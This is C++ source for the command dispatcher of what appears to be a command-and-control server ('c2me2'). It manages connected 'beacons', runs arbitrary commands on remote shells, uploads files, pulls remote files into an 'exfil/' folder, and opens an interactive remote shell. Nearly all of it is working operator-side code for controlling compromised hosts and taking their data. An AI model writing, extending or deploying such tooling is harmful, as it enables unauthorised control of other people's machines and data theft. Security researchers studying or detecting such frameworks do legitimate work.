#include "dispatcher.hpp"
#include "session_manager.hpp"
#include "pty_session.hpp"
#include "../common/logging.hpp"

#include <iostream>
#include <sstream>
#include <vector>
#include <fstream>
#include <unistd.h>
#include <dirent.h>
#include <sys/socket.h>

// Forward declaration
static void interactiveSessionLoop(int sessionId);

static std::vector<std::string> split(const std::string& str) {
    std::istringstream iss(str);
    std::vector<std::string> tokens;
    std::string token;
    while (iss >> token) {
        tokens.push_back(token);
    }
    return tokens;
}

namespace c2me2 {
    namespace server {

        static void printSessions() {
            auto sessions = SessionManager::instance().listSessions();
            std::cout << "[Sessions]\n";
            for (auto s : sessions) {
                std::cout << "Session ID: " << s->getSessionId()
                          << ", Client IP: " << s->getClientIp() << "\n";
            }
            std::cout << "Total active sessions: " << sessions.size() << "\n";
        }

        static void commandExecute(const std::vector<std::string>& tokens) {
            if (tokens.size() < 4 || tokens[1] != "-c") {
                std::cout << "Usage: execute -c <session_id> cmd\n";
                return;
            }

            int sessionId = std::stoi(tokens[2]);
            auto session = SessionManager::instance().getSession(sessionId);
            if (!session) {
                std::cout << "Invalid session ID.\n";
                return;
            }

            std::ostringstream oss;
            for (size_t i = 3; i < tokens.size(); i++) {
                if (i > 3) oss << " ";
                oss << tokens[i];
            }
            std::string cmd = oss.str();

            std::string output = session->executeCommand(cmd);
            session->logCommand(cmd, output); // Log command and output
            std::cout << output;
        }

        static void commandUpload(const std::vector<std::string>& tokens) {
            if (tokens.size() < 3) {
                std::cout << "Usage: upload <local_file> <session_id>\n";
                return;
            }

            std::string localFile = tokens[1];
            int sessionId = std::stoi(tokens[2]);
            auto session = SessionManager::instance().getSession(sessionId);
            if (!session) {
                std::cout << "Invalid session ID.\n";
                return;
            }

            std::string remoteFile = localFile.substr(localFile.find_last_of("/\\") + 1); // Use basename
            if (session->uploadThroughShell(localFile, remoteFile)) {
                std::cout << "File uploaded successfully.\n";
            } else {
                std::cout << "File upload failed.\n";
            }
        }

        static void commandDownload(const std::vector<std::string>& tokens) {
            if (tokens.size() < 3) {
                std::cout << "Usage: download <remote_file> <session_id>\n";
                return;
            }

            std::string remoteFile = tokens[1];
            int sessionId = std::stoi(tokens[2]);
            auto session = SessionManager::instance().getSession(sessionId);
            if (!session) {
                std::cout << "Invalid session ID.\n";
                return;
            }

            std::string localPath = "exfil/" + remoteFile;
            if (session->downloadThroughShell(remoteFile, localPath)) {
                std::cout << "File downloaded successfully to " << localPath << ".\n";
            } else {
                std::cout << "File download failed.\n";
            }
        }

        static void localLPWD() {
            char cwd[4096];
            if (getcwd(cwd, sizeof(cwd)) != nullptr) {
                std::cout << cwd << "\n";
            } else {
                std::cout << "Failed to get current directory.\n";
            }
        }

        static void localLCD(const std::string& path) {
            if (path.empty()) {
                std::cout << "Usage: lcd <path>\n";
                return;
            }
            if (chdir(path.c_str()) != 0) {
                std::cout << "Failed to change directory to: " << path << "\n";
            }
        }

        static void localLLS(const std::string& path) {
            std::string dirPath = path.empty() ? "." : path;
            DIR* d = opendir(dirPath.c_str());
            if (!d) {
                std::cout << "Failed to open directory: " << dirPath << "\n";
                return;
            }

            std::cout << "Listing: " << dirPath << "\n";
            struct dirent* entry;
            while ((entry = readdir(d)) != nullptr) {
                std::cout << entry->d_name << "\n";
            }
            closedir(d);
        }

        static void interactiveSessionLoop(int sessionId) {
            std::cout << "Entering interactive mode with session " << sessionId << ". Type 'exit' to return.\n";
            std::cout << "Interactive shell started. Type 'exit' to return.\n";

            auto session = SessionManager::instance().getSession(sessionId);
            if (!session) {
                std::cout << "Session no longer available.\n";
                return;
            }

            std::atomic<bool> running{true};
            std::thread reader_thread([&]() {
                char buf[1024];
                while (running) {
                    ssize_t n = read(session->getFd(), buf, sizeof(buf)-1);
                    if (n > 0) {
                        buf[n] = '\0';
                        std::cout << buf;
                        std::fflush(stdout);
                    } else if (n <= 0) {
                        break;
                    }
                }
            });

            while (true) {
                std::string input;
                if (!std::getline(std::cin, input)) {
                    break;
                }

                if (input == "exit") {
                    std::cout << "Returning to main prompt.\n";
                    break;
                } else if (input.rfind("!", 0) == 0) {
                    std::string local_cmd = input.substr(1);
                    if (local_cmd == "lpwd") {
                        localLPWD();
                    } else if (local_cmd.rfind("lcd ", 0) == 0) {
                        std::string path = local_cmd.substr(4);
                        localLCD(path);
                    } else if (local_cmd.rfind("lls", 0) == 0) {
                        std::string path;
                        if (local_cmd.size() > 4) path = local_cmd.substr(4);
                        localLLS(path);
                    } else {
                        std::cout << "Unknown local command.\n";
                    }
                } else {
                    std::string cmd = input + "\n";
                    write(session->getFd(), cmd.c_str(), cmd.size());
                }
            }

            running = false;
            shutdown(session->getFd(), SHUT_RD);
            if (reader_thread.joinable()) reader_thread.join();
        }

        void Dispatcher::handleCommand(const std::string& cmd, bool&, int&) {
            auto tokens = split(cmd);
            if (tokens.empty()) return;

            if (tokens[0] == "help" || tokens[0] == "?") {
                std::cout << "Available commands:\n";
                std::cout << "  help, ?                     : Show help\n";
                std::cout << "  beacons -l/-i/-k ...        : Manage sessions\n";
                std::cout << "  sessions                    : Alias for beacons\n";
                std::cout << "  execute -c <session_id> cmd : Run a command in remote shell\n";
                std::cout << "  upload <local_file> <id>    : Upload a file via shell\n";
                std::cout << "  download <remote_file> <id> : Download a file via shell\n";
                std::cout << "  exit, quit                  : Exit the program\n";
                return;
            } else if (tokens[0] == "exit" || tokens[0] == "quit") {
                std::cout << "Exiting...\n";
                std::exit(0);
            } else if (tokens[0] == "beacons" || tokens[0] == "sessions") {
                if (tokens.size() > 1) {
                    if (tokens[1] == "-l") {
                        printSessions();
                        return;
                    } else if (tokens[1] == "-i") {
                        if (tokens.size() < 3) {
                            std::cout << "Usage: beacons -i <session_id>\n";
                            return;
                        }
                        int sessionId = std::stoi(tokens[2]);
                        auto session = SessionManager::instance().getSession(sessionId);
                        if (!session) {
                            std::cout << "Invalid session ID.\n";
                            return;
                        }
                        interactiveSessionLoop(sessionId);
                        return;
                    } else if (tokens[1] == "-k") {
                        if (tokens.size() < 3) {
                            std::cout << "Usage: beacons -k <session_id>\n";
                            return;
                        }
                        int sessionId = std::stoi(tokens[2]);
                        SessionManager::instance().removeSession(sessionId);
                        std::cout << "Session " << sessionId << " terminated.\n";
                        return;
                    }
                }
                std::cout << "Unknown command. Try: beacons -l, -i <id>, or -k <id>\n";
                return;
            } else if (tokens[0] == "execute") {
                commandExecute(tokens);
                return;
            } else if (tokens[0] == "upload") {
                commandUpload(tokens);
                return;
            } else if (tokens[0] == "download") {
                commandDownload(tokens);
                return;
            }

            std::cout << "Unknown command.\n";
        }

    } // namespace server
} // namespace c2me2

